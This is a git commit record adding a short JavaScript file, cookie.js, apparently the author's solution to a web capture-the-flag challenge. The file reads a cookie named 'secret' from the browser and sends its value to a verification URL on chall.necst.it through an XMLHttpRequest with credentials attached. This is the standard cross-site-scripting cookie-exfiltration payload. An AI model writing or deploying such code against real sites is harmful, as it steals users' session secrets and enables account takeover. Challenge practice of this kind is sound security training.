c10ca262029138b139df8584a135f7f13bbcd1f2
tommasofioravanti <tommaso.fiora8@gmail.com>
2019-04-30 10:37:40 +0200

    Add files via upload

---
+++ cookie.js
@@ -0,0 +1,9 @@
+function gCookie(a){var b=document.cookie.match('(^|[^;]+)\\s*'+a+'\\s*=\\s*([^;]+)');return b?b.pop():'';}
+
+function execute(){
+  var request=new XMLHttpRequest();
+  var address="https://chall.necst.it/challenges/web3/verify/932/"+gCookie("secret");
+  request.open("GET", address, true);
+  request.withCredentials = true;
+  request.send();
+}
